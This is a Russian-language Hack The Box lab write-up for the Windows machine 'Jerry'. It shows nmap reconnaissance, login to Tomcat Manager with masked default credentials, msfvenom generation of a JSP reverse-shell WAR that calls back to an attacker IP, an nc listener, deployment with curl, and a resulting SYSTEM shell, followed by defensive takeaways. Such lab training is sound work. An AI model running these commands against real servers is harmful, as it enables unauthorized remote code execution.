# Jerry (HTB)

> Платформа: Hack The Box  
> ОС: Windows  
> Сложность: Легко  
> Результат: SYSTEM

---

## Цепочка Атаки

```text
Разведка
├── nmap -p- --min-rate 5000 → 8080 (Apache Tomcat/Coyote JSP engine 1.1)
└── /manager/html открыт (401 Unauthorized, Basic realm="Tomcat Manager Application")

Первичный Доступ (Дефолтные Креды)
├── Дефолтные креды tomcat:<PASSWORD> на /manager/html → 200 OK
├── msfvenom -p java/jsp_shell_reverse_tcp → shell.war
├── curl -u tomcat:<PASSWORD> --upload-file shell.war → деплой в /shell
└── Триггер JSP-пейлоада → reverse shell как NT AUTHORITY\SYSTEM

Флаги
├── C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
├── user.txt → <USER_FLAG>
└── root.txt → <ROOT_FLAG>
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Jerry - простая Windows-машина с Apache Tomcat 7.0.88. Приложение Tomcat Manager защищено дефолтными учетными данными (`tomcat:<PASSWORD>`), которые хорошо задокументированы в примерах конфигурации Tomcat. После аутентификации менеджер позволяет развертывать произвольные WAR-файлы (Web Application Archive). Загрузив вредоносный WAR с JSP reverse shell, атакующий получает выполнение кода. Поскольку Tomcat на этом хосте работает с высокими привилегиями, шелл получается как `NT AUTHORITY\SYSTEM`.

---

## Разведка

### Сканирование Портов

```bash
ports=$(nmap -p- --min-rate=5000 -T4 -Pn -n jerry.htb -oG - | awk '/open/{for(i=4;i<=NF;i++){split($i,a,"/"); if(a[2]=="open") printf a[1]","}}' | sed 's/,$//'); echo "$ports"
```

```
8080
```

```bash
nmap -sC -sV -Pn -n -p 8080 jerry.htb
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

Сервис - Apache Tomcat версии 7.0.88. Веб-интерфейс показывает приложения manager и host-manager.

### Веб Разведка

Переход на `http://jerry.htb:8080/` показывает стандартную страницу Tomcat. Эндпоинт `/manager/html` требует аутентификации:

```bash
curl -s -i http://jerry.htb:8080/manager/html | head -10
```

```
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

Это подтверждает, что Tomcat Manager существует и защищен Basic-аутентификацией.

---

## Первичный Доступ

No CVE (custom vulnerability) - the Apache Tomcat Manager is configured with default credentials `tomcat:<PASSWORD>`.

### Дефолтные Креды

Документация Tomcat и сообщения об ошибках иногда ссылаются на эту пару как на пример. Попытка входа в `/manager/html` с `tomcat:<PASSWORD>` дает доступ:

```bash
curl -s -i -u tomcat:<PASSWORD> http://jerry.htb:8080/manager/html | head -10
```

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=<SESSION_ID>; Path=/manager; HttpOnly
Content-Type: text/html;charset=utf-8
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Деплой WAR

Интерфейс Manager предоставляет секцию "Deploy", которая принимает `.war` файлы. Генерируем вредоносный WAR с помощью `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.76 LPORT=4444 -f war -o shell.war
```

```
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: shell.war
```

Запускаем listener:

```bash
nc -lvnp 4444
```

Деплоим WAR через Manager:

```bash
curl -u tomcat:<PASSWORD> --upload-file shell.war "http://jerry.htb:8080/manager/text/deploy?path=/shell&update=true"
```

```
OK - Deployed application at context path /shell
```

Определяем имя JSP-файла внутри архива:

```bash
jar tf shell.war
```

```
WEB-INF/
WEB-INF/web.xml
afhxosamxq.jsp
```

Триггерим пейлоад, запрашивая JSP-файл:

```bash
curl http://jerry.htb:8080/shell/afhxosamxq.jsp
```

Listener получает соединение:

```
connect to [10.10.15.76] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Повышение Привилегий

Повышение привилегий не требуется. Служба Tomcat работает как `NT AUTHORITY\SYSTEM`, поэтому reverse shell уже имеет максимальные привилегии на хосте.

```cmd
whoami
```

```
nt authority\system
```

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

```
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Флаги

| Флаг | Значение       |
|------|----------------|
| User | `<USER_FLAG>`  |
| Root | `<ROOT_FLAG>`  |

### Файл Флагов

Оба флага находятся в `C:\Users\Administrator\Desktop\flags\`:

```cmd
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

```
user.txt
<USER_FLAG>

root.txt
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Ключевые Выводы

- **Дефолтные учетные данные - критический риск.** Пара `tomcat:<PASSWORD>` задокументирована в примерах Tomcat; оставлять ее без изменений на открытом интерфейсе менеджера равносильно отсутствию аутентификации.
- **Развертывание WAR - встроенная функция, а не уязвимость.** Tomcat Manager предназначен для развертывания приложений. Если атакующий получает доступ, эта функция становится вектором эксплуатации.
- **Tomcat часто работает с высокими привилегиями на Windows.** Получение шелла через Tomcat часто дает `SYSTEM`, минуя необходимость локального повышения привилегий.
- **Оба флага в одном файле.** Jerry помещает оба флага (user и root) в один файл (`2 for the price of 1.txt`), редкое удобство для атакующего.
